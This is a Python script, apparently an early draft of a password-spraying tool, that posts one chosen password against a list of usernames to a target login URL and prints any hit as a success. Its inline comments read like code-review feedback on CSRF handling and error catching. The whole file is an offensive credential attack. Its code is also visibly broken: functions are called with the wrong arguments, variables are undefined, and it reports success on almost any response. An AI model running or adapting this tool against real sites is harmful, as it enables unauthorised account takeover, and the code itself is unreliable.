import requests

#Code reviewed, time to hustle.
def passwordSpray(password: str, url: str) -> bool:
    #if framework == "Jinga2" or "jinga2":                     // Future code for framework handling
        #csrf = ["{{ csrf_token }}", "{% csrf_token %}"]       // Sets csrf list to include formats present
    #elif framework == "Django" or "django":                   // within that templating engine
        #csrf = ["csrf_token", "{% csrf_token %}"]
    
    print("""
     _____ _               _____                       _  ______            _        __                   
    /  __ | |             |  ___|                     | | | ___ \          | |      / _|                  
    | /  \| | __ _ ___ ___| |__ _ __ __ _ ___  ___  __| | | |_/ /_ __ _   _| |_ ___| |_ ___  _ __ ___ ___ 
    | |   | |/ _` / __/ __|  __| '__/ _` / __|/ _ \/ _` | | ___ | '__| | | | __/ _ |  _/ _ \| '__/ __/ _ \\
    | \__/| | (_| \__ \__ | |__| | | (_| \__ |  __| (_| | | |_/ | |  | |_| | ||  __| || (_) | | | (_|  __/
     \____|_|\__,_|___|___\____|_|  \__,_|___/\___|\__,_| \____/|_|   \__,_|\__\___|_| \___/|_|  \___\___|\n\n""")
    
    for username in usernames:
        username = username.replace(" ", "")
        print(f"Trying:", {username})                                               # Interesting, I will investigate what is the best to call
        data = {"username": username,"password": password,"login":"submit"} # login value will only work for very few back-end oriented auth systems
        response = requests.post(url, data=data)
        if not requests.ok:
            #Code here for debug, if I move unsuccessful passwords out, then the final list is self-documenting.
            print(username.pop(username))
            pass
        if "csrf" in str(response.content):
                                                    # I sorta get what you're saying here, but I don't understand the benefits. Am I correct to say, init the dictionary and then save headers response into that dict to be looked at further?
            print("CSRF token detected") # you can add headers like: response = requests.post(url, data=data, headers=headers) and create a headers dict for the CSRF token
            return False
        else:
            print(f"Success: Username: ---> ", {username}, "\n", "Password: ---> ", {password})
            return True


if __name__ == '__main__':
    url = input("Enter Target Url: ")
    password = input("Enter Target Password: ")
    error = input("Enter Wrong User Error Message: ")
    #framework = input("Enter target framework (will be used to set params to look for): ")
    
    try:
        passwordSpray()
    except:
        print("Exception occured!!") # Be more explicit, catch specific exceptions to make life easier later on

    #compile list from engagement notes
    with open("usernames.txt", "r") as usernames:
        passwordSpray(password,url,error)
    
    print("[!!] Username not in list")